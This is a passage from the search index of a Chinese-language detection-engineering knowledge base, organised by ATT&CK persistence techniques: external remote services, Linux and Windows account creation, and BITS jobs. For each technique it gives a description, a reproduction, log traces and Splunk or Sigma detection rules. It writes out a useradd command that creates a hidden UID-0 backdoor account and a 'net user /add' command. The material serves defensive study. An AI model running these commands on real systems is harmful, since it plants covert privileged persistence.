<p>https://attack.mitre.org/techniques/T1098/</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/","title":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>VPN\uff0cCitrix\u548c\u5176\u4ed6\u8bbf\u95ee\u673a\u5236\u7b49\u8fdc\u7a0b\u670d\u52a1\u4f7f\u7528\u6237\u53ef\u4ee5\u4ece\u5916\u90e8\u4f4d\u7f6e\u8fde\u63a5\u5230\u5185\u90e8\u4f01\u4e1a\u7f51\u7edc\u8d44\u6e90\u3002\u7ecf\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u7684\u8fde\u63a5\u548c\u51ed\u636e\u8eab\u4efd\u9a8c\u8bc1\u3002Windows Remote Management\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u6765\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5728\u7f51\u5185\u7528\u4f5c\u6301\u4e45\u5316\u3002\u901a\u5e38\u9700\u8981\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u624d\u80fd\u4f7f\u7528\u8be5\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7\u51ed\u636e\u7be1\u6539\u6216\u5728\u8fdb\u5165\u4f01\u4e1a\u7f51\u7edc\u4e4b\u540e\u4ece\u7528\u6237\u90a3\u91cc\u83b7\u53d6\u51ed\u636e\u6765\u83b7\u5f97\u6b64\u6743\u9650\u3002\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u5c06\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6309\u7167MITRE\u5b98\u65b9\u793a\u4f8b\uff0c\u50cfVPN\u3001\u8fdc\u7a0b\u684c\u9762\u3001SSH\u7b49\u90fd\u53ef\u4ee5\u5c5e\u4e8eT1133\u5916\u90e8\u8fdc\u7a0b\u8bbf\u95ee\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>SSH\u65e5\u5fd7\u3001VPN\u65e5\u5fd7\u3001\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u6765\u68c0\u6d4b\u653b\u51fb\u8005\u5bf9\u6709\u6548\u5e10\u6237\u7684\u4f7f\u7528\uff0c\u4ee5\u5bf9\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6536\u96c6\u8eab\u4efd\u9a8c\u8bc1\u65e5\u5fd7\u5e76\u5206\u6790\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\uff0c\u6d3b\u52a8\u7a97\u53e3\u4ee5\u53ca\u6b63\u5e38\u5de5\u4f5c\u65f6\u95f4\u4e4b\u5916\u7684\u8bbf\u95ee\u3002</p> <p>\u901a\u8fc7VPN\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6848\u4f8b\uff0c\u4e0d\u5728\u4e00\u4e00\u63cf\u8ff0\u3002\u53ef\u5229\u7528\u7528\u6237\u8d26\u6237\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002\u8fdc\u7a0b\u684c\u9762\u3001SSH\u4e5f\u53ef\u6839\u636e\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1133</p> <p>https://attack.mitre.org/techniques/T1133/</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/","title":"T1136-001-linux-\u521b\u5efa\u7528\u6237","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u62e5\u6709\u8db3\u591f\u7684\u8bbf\u95ee\u7ea7\u522b\u53ef\u4ee5\u521b\u5efa\u672c\u5730\u8d26\u6237\u6216\u8005\u57df\u8d26\u6237\u3002\u6b64\u7c7b\u8d26\u6237\u53ef\u4ee5\u7528\u4e8e\u6743\u9650\u7ef4\u6301\uff0c\u6301\u4e45\u6027\uff0c\u4e0d\u9700\u8981\u5728\u7cfb\u7edf\u4e0a\u90e8\u7f72\u540e\u95e8\u5de5\u5177\u6765\u5b9e\u73b0\u6743\u9650\u7ef4\u6301\u3002</p> <p>\u8fd9\u4e9bNet user\u547d\u4ee4\u53ef\u7528\u4e8e\u521b\u5efa\u672c\u5730\u6216\u57df\u8d26\u6237\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>useradd -o -u 0 -g 0 -M -d / root -s / bin / bash\uff03{\u7528\u6237\u540d}</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>/var/log/auth.log \uff08\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u6211\u66f4\u5e0c\u671b\u4f60\u80fd\u591f\u4f7f\u7528audit\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u5b83\u4f1a\u5f88\u65b9\u4fbf\uff09</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/$ sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash abc(\u7528\u6237\u540d)</p> <p>icbc@icbc:/$ cat /etc/passwd</p> <p>root: x:0:0:root:/root:/bin/bash</p> <p>......</p> <p>abc: x:0:0:root:/root:/bin/bash</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>icbc@icbc:/$sudo cat /var/log/auth.log</p> <p>Aug  9 13:42:33 icbc sudo:     icbc : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash abc Aug  9 13:42:34 icbc sudo: pam_unix(sudo:session): session opened for user root by (uid=0) Aug  9 13:42:34 icbc useradd[18979]: new user: name=abc, UID=0, GID=0, home=/root, shell=/bin/bash</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>Root Account Creation: index=linux  source=\"/var/log/auth.log\" eventtype=useradd UID=0 OR GID=0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1136-001</p> <p>https://attack.mitre.org/techniques/T1136/001/</p> <p>linux\u547d\u4ee4\u8be6\u89e3\u4e4buseradd\u547d\u4ee4\u4f7f\u7528\u65b9\u6cd5</p> <p>https://blog.csdn.net/u011537073/article/details/51987121</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/","title":"T1136-001-win-\u521b\u5efa\u672c\u5730\u8d26\u6237","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5177\u6709\u8db3\u591f\u8bbf\u95ee\u7ea7\u522b\u6743\u9650\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u672c\u5730\u7cfb\u7edf\u6216\u57df\u8d26\u53f7\u3002\u6b64\u7c7b\u8d26\u53f7\u53ef\u7528\u4e8e\u6301\u4e45\u6027\uff0c\u4e0d\u9700\u8981\u5728\u7cfb\u7edf\u4e0a\u90e8\u7f72\u6301\u4e45\u6027\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u3002</p> <p>\u5728\u4e91\u73af\u5883\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u521b\u5efa\u4ec5\u7528\u4e8e\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1\u7684\u8d26\u6237\uff0c\u4ece\u800c\u51cf\u5c11\u88ab\u68c0\u6d4b\u5230\u7684\u53ef\u80fd\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#windows","title":"Windows","text":"<p>\u53ef\u4f7f\u7528net user\u547d\u4ee4\u6765\u521b\u5efa\u672c\u5730\u6216\u57df\u8d26\u53f7\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#office-365","title":"Office 365","text":"<p>\u6709\u6743\u8bbf\u95ee\u5168\u5c40\u7ba1\u7406\u5458\u8d26\u6237\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u5176\u4ed6\u8d26\u6237\uff0c\u5e76\u4e3a\u5176\u5206\u914d\u5168\u5c40\u7ba1\u7406\u5458\u89d2\u8272\u4ee5\u4fbf\u80fd\u6301\u4e45\u8bbf\u95eeOffice 365\u79df\u6237\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5229\u7528Net user\u547d\u4ee4\u521b\u5efa\u672c\u5730\u7528\u6237</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_4","title":"\u672c\u5730\u521b\u5efa\u8d26\u6237","text":"<pre><code>Microsoft Windows [\u7248\u672c 6.1.7601]\n\u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Windows\\system32&gt;net user admin.123 admin1 /add\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>\u65e5\u5fd7\u540d\u79f0:          Security\n\u6765\u6e90:            Microsoft-Windows-Security-Auditing\n\u65e5\u671f:            2020/6/7 22:09:21\n\u4e8b\u4ef6 ID:         4720 #\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002\n\u4efb\u52a1\u7c7b\u522b:          \u7528\u6237\u5e10\u6237\u7ba1\u7406\n\u7ea7\u522b:            \u4fe1\u606f\n\u5173\u952e\u5b57:           \u5ba1\u6838\u6210\u529f\n\u7528\u6237:            \u6682\u7f3a\n\u8ba1\u7b97\u673a:           12306Br0-PC\n\u63cf\u8ff0:\n\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002\n\n\u4e3b\u9898:\n \u5b89\u5168 ID: 12306Br0-PC\\12306Br0\n \u5e10\u6237\u540d: 12306Br0\n \u5e10\u6237\u57df: 12306Br0-PC\n \u767b\u5f55 ID: 0x75a8e\n\n\u65b0\u5e10\u6237:\n \u5b89\u5168 ID: 12306Br0-PC\\admin.123\n \u5e10\u6237\u540d: admin.123\n \u5e10\u6237\u57df: 12306Br0-PC\n\n\u5c5e\u6027:\n SAM \u5e10\u6237\u540d: admin.123\n \u663e\u793a\u540d\u79f0: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u7528\u6237\u4e3b\u4f53\u540d\u79f0: -\n \u4e3b\u76ee\u5f55: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u4e3b\u9a71\u52a8\u5668: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u811a\u672c\u8def\u5f84: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u914d\u7f6e\u6587\u4ef6\u8def\u5f84: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u7528\u6237\u5de5\u4f5c\u7ad9: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u4e0a\u6b21\u8bbe\u7f6e\u7684\u5bc6\u7801:&lt;\u4ece\u4e0d&gt;\n \u5e10\u6237\u8fc7\u671f: &lt;\u4ece\u4e0d&gt;\n \u4e3b\u8981\u7ec4 ID: 513\n \u5141\u8bb8\u59d4\u6258\u7ed9: -\n \u65e7 UAC \u503c: 0x0\n \u65b0 UAC \u503c: 0x15\n \u7528\u6237\u5e10\u6237\u63a7\u5236:\n \u5df2\u7981\u7528\u7684\u5e10\u6237\n '\u4e0d\u8981\u6c42\u5bc6\u7801' - \u5df2\u542f\u7528\n '\u666e\u901a\u5e10\u6237' - \u5df2\u542f\u7528\n \u7528\u6237\u53c2\u6570: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n SID \u5386\u53f2: -\n \u767b\u5f55\u65f6\u95f4(\u4ee5\u5c0f\u65f6\u8ba1):\u5168\u90e8\n\n\u9644\u52a0\u4fe1\u606f:\n \u7279\u6743 -\n\u4e8b\u4ef6 Xml:\n&lt;Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"&gt;\n  &lt;System&gt;\n    &lt;Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /&gt;\n    &lt;EventID&gt;4720&lt;/EventID&gt;\n    &lt;Version&gt;0&lt;/Version&gt;\n    &lt;Level&gt;0&lt;/Level&gt;\n    &lt;Task&gt;13824&lt;/Task&gt;\n    &lt;Opcode&gt;0&lt;/Opcode&gt;\n    &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;\n    &lt;TimeCreated SystemTime=\"2020-06-07T14:09:21.622933400Z\" /&gt;\n    &lt;EventRecordID&gt;3893&lt;/EventRecordID&gt;\n    &lt;Correlation /&gt;\n    &lt;Execution ProcessID=\"504\" ThreadID=\"2080\" /&gt;\n    &lt;Channel&gt;Security&lt;/Channel&gt;\n    &lt;Computer&gt;12306Br0-PC&lt;/Computer&gt;\n    &lt;Security /&gt;\n  &lt;/System&gt;\n  &lt;EventData&gt;\n    &lt;Data Name=\"TargetUserName\"&gt;admin.123&lt;/Data&gt;\n    &lt;Data Name=\"TargetDomainName\"&gt;12306Br0-PC&lt;/Data&gt;\n    &lt;Data Name=\"TargetSid\"&gt;S-1-5-21-3579006141-3881886638-2121494774-1001&lt;/Data&gt;\n    &lt;Data Name=\"SubjectUserSid\"&gt;S-1-5-21-3579006141-3881886638-2121494774-1000&lt;/Data&gt;\n    &lt;Data Name=\"SubjectUserName\"&gt;12306Br0&lt;/Data&gt;\n    &lt;Data Name=\"SubjectDomainName\"&gt;12306Br0-PC&lt;/Data&gt;\n    &lt;Data Name=\"SubjectLogonId\"&gt;0x75a8e&lt;/Data&gt;\n    &lt;Data Name=\"PrivilegeList\"&gt;-&lt;/Data&gt;\n    &lt;Data Name=\"SamAccountName\"&gt;admin.123&lt;/Data&gt;\n    &lt;Data Name=\"DisplayName\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"UserPrincipalName\"&gt;-&lt;/Data&gt;\n    &lt;Data Name=\"HomeDirectory\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"HomePath\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"ScriptPath\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"ProfilePath\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"UserWorkstations\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"PasswordLastSet\"&gt;%%1794&lt;/Data&gt;\n    &lt;Data Name=\"AccountExpires\"&gt;%%1794&lt;/Data&gt;\n    &lt;Data Name=\"PrimaryGroupId\"&gt;513&lt;/Data&gt;\n    &lt;Data Name=\"AllowedToDelegateTo\"&gt;-&lt;/Data&gt;\n    &lt;Data Name=\"OldUacValue\"&gt;0x0&lt;/Data&gt;\n    &lt;Data Name=\"NewUacValue\"&gt;0x15&lt;/Data&gt;\n    &lt;Data Name=\"UserAccountControl\"&gt;\n     %%2080\n     %%2082\n     %%2084&lt;/Data&gt;\n    &lt;Data Name=\"UserParameters\"&gt;%%1793&lt;/Data&gt;\n    &lt;Data Name=\"SidHistory\"&gt;-&lt;/Data&gt;\n    &lt;Data Name=\"LogonHours\"&gt;%%1797&lt;/Data&gt;\n  &lt;/EventData&gt;\n&lt;/Event&gt;\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u672c\u5730\u7528\u6237\u521b\u5efa\ndescription: \u68c0\u6d4bWindows\u670d\u52a1\u5668\u4e0a\u7684\u672c\u5730\u7528\u6237\u521b\u5efa\uff0c\u8fd9\u5728Active Directory\u73af\u5883\u4e2d\u4e0d\u9002\u7528\u3002\u4f7f\u7528\u672c\u5730\u65e5\u5fd7\uff0c\u975eAD\u65e5\u5fd7\u3002\nstatus: \u6d4b\u8bd5\u9636\u6bb5\ntags:\n    - attack.persistence\n    - attack.t1136-001\nreferences:\n    - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/\nauthor: 12306Br0(\u7ffb\u8bd1)\ndate: 2020/06/07\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4720 #\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002\n    condition: selection\nfields:\n    - EventCode\n    - AccountName\n    - AccountDomain\nfalsepositives:\n    - \u57df\u63a7\u5236\u5668\u65e5\u5fd7\n    - \u7531\u7279\u6743\u5e10\u6237\u7ba1\u7406\u5de5\u5177\u7ba1\u7406\u7684\u672c\u5730\u5e10\u6237\nlevel: low\n</code></pre> <p>\u9664\u4e86\u57fa\u4e8e\u4e8b\u4ef6ID4720\u8fdb\u884c\u68c0\u6d4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8b\u4ef6ID4688\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08net user\uff09\u6765\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#splunk","title":"Splunk\u89c4\u5219","text":"<pre><code>EventID=\"4720\" | table EventCode,AccountName,AccountDomain\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_7","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u6839\u636e4688\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u53ca4720\u76f8\u4e92\u7ed3\u5408\u8fdb\u884c\u68c0\u6d4b\u672c\u5730\u7528\u6237\u521b\u5efa\u884c\u4e3a\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1136-001</p> <p>https://attack.mitre.org/techniques/T1136/001/</p> <p>Local User Creation</p> <p>https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_user_creation.yml</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","title":"T1197-win-BITS Jobs\u6743\u9650\u7ef4\u6301","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows BITS\uff08\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff09\u662f\u4e00\u79cd\u901a\u8fc7COM\uff08\u7ec4\u4ef6\u5bf9\u8c61\u6a21\u578b\uff09\u516c\u5f00\u7684\u4f4e\u5e26\u5bbd\u5f02\u6b65\u6587\u4ef6\u4f20\u8f93\u673a\u5236\u3002BITS\u901a\u5e38\u7531\u66f4\u65b0\u7a0b\u5e8f\u3001\u6d88\u606f\u7a0b\u5e8f\u548c\u5176\u4ed6\u5e0c\u671b\u5728\u540e\u53f0\u8fd0\u884c\uff08\u4f7f\u7528\u53ef\u7528\u7a7a\u95f2\u5e26\u5bbd\uff09\u800c\u4e0d\u4e2d\u65ad\u5176\u4ed6\u7f51\u7edc\u5e94\u7528\u7684\u7a0b\u5e8f\u4f7f\u7528\u3002\u6587\u4ef6\u4f20\u8f93\u4efb\u52a1\u88ab\u5b9e\u73b0\u4e3aBITS\u4efb\u52a1\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u64cd\u4f5c\u961f\u5217\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7PowerShell\u548cBITSAdmin\u5de5\u5177\u8bbf\u95eeBITS\u4efb\u52a1\u521b\u5efa\u548c\u7ba1\u7406\u63a5\u53e3\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u8fd0\u884c\u6076\u610f\u4ee3\u7801\u540e\u6ee5\u7528BITS\u6765\u5b9e\u73b0\u4e0b\u8f7d\u3001\u6267\u884c\u751a\u81f3\u6e05\u7406\u52a8\u4f5c\u3002BITS\u4efb\u52a1\u5305\u542b\u5728BITS\u4efb\u52a1\u6570\u636e\u5e93\u4e2d\uff0c\u4e0d\u9700\u521b\u5efa\u65b0\u6587\u4ef6\u6216\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4e14\u901a\u5e38\u662f\u4e3b\u673a\u9632\u706b\u5899\u5141\u8bb8\u7684\u3002\u542f\u7528BITS\u7684\u6267\u884c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u957f\u671f\u4efb\u52a1\uff08\u9ed8\u8ba4\u6700\u5927\u751f\u547d\u5468\u671f\u4e3a90\u5929\u4e14\u53ef\u5ef6\u957f\uff09\u6216\u5728\u4efb\u52a1\u5b8c\u6210\u6216\u51fa\u73b0\u9519\u8bef\uff08\u5305\u62ec\u7cfb\u7edf\u91cd\u542f\u540e\u7684\u9519\u8bef\uff09\u65f6\u8c03\u7528\u4efb\u610f\u7a0b\u5e8f\u6765\u5141\u8bb8\u6301\u4e45\u6027\u3002</p> <p>BITS\u4e0a\u4f20\u529f\u80fd\u4e5f\u53ef\u7528\u4e8e\u6267\u884cExfiltration Over Alternative Protocol\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Windows\u64cd\u4f5c\u7cfb\u7edf\u5305\u542b\u5404\u79cd\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u6765\u6267\u884c\u5404\u79cd\u4efb\u52a1\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u4e00\u662f\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff08BITS\uff09\uff0c\u5b83\u53ef\u4ee5\u4fc3\u8fdb\u6587\u4ef6\u5230Web\u670d\u52a1\u5668\uff08HTTP\uff09\u548c\u5171\u4eab\u6587\u4ef6\u5939\uff08SMB\uff09\u7684\u4f20\u8f93\u80fd\u529b\u3002Microsoft\u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3a\u201cbitsadmin\u201d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u548cPowerShell cmdlet\uff0c\u7528\u4e8e\u521b\u5efa\u548c\u7ba1\u7406\u6587\u4ef6\u4f20\u8f93\u3002</p> 